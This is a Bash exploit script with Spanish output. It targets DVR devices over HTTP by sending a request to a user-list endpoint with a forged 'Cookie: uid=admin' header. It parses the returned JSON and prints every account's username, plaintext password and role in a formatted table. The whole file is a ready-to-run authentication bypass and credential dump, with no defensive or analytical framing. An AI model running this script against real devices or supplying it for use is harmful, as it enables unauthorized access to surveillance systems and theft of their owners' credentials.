#!/bin/bash

banner=$(cat << "EOF"
                             __..--.._
      .....              .--~  .....  `.
    .":    "`-..  .    .'" ..-'"    :". `
    ` `._ ` _.'`"(     `-"'`._ ' _.' '
         ~~~      `.          ~~~
                  .'
                 /
                (
                 ^---


 [*] Sin nombre
EOF
)

GREEN='\033[32m'
RED='\033[0;31m'
DEFAULT='\033[0m'
ORANGE='\033[33m'
CYAN='\033[36m'

print_usage() {
    echo "Uso: $0 --host <host> [--port <port>]"
    echo "Ejemplo: $0 --host 192.168.1.101 --port 81"
}

PORT=80

while [[ "$#" -gt 0 ]]; do
    case $1 in
        --host) HOST="$2"; shift ;;
        --port) PORT="$2"; shift ;;
        -h|--help) print_usage; exit 0 ;;
        *) echo "Parámetro desconocido: $1"; print_usage; exit 1 ;;
    esac
    shift
done

if [ -z "$HOST" ]; then
    echo "Se requiere el host."
    print_usage
    exit 1
fi

fullHost_1="http://$HOST:$PORT/device.rsp?opt=user&cmd=list"
host="http://$HOST:$PORT/"

echo -e "${GREEN}${banner}${DEFAULT}"

makeReqHeaders() {
    cat <<EOF
Host: $host
User-Agent: Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-AR,en-US;q=0.7,en;q=0.3
Connection: close
Content-Type: text/html
Cookie: uid=admin
EOF
}

response=$(curl -s -L --connect-timeout 10 -H "$(makeReqHeaders)" "$fullHost_1")
echo "Respuesta JSON:"
echo "$response"

if [ $? -ne 0 ]; then
    echo -e "${RED} [+] Tiempo de espera agotado${DEFAULT}"
    exit 1
fi

totUsr=$(echo "$response" | jq '.list | length')
if [ $? -ne 0 ]; then
    echo " [+] Error: Error al analizar la respuesta JSON"
    exit 1
fi

echo -e "${GREEN}\n [+] DVR (url):\t\t${ORANGE}${host}${GREEN}"
echo -e " [+] Puerto: \t\t${ORANGE}${PORT}${DEFAULT}"
echo -e "${GREEN}\n [+] Lista de usuarios:\t${ORANGE}${totUsr}${DEFAULT}\n"

echo -e "${CYAN}╔════════════════════════════════════════════════════════════════════════╗"
echo -e "║          Nombre de usuario         Contraseña              ID de rol         ║"
echo -e "╠══════════════════════════════════════════════════════════════════════════╣"
for ((i=0;i<totUsr;i++)); do
    username=$(echo "$response" | jq -r ".list[$i].uid")
    password=$(echo "$response" | jq -r ".list[$i].pwd")
    role=$(echo "$response" | jq -r ".list[$i].role")
    printf "║%20s\t\t%20s\t\t%20s\t\t║\n" "$username" "$password" "$role"
done
echo -e "${CYAN}╚════════════════════════════════════════════════════════════════════════╝${DEFAULT}"
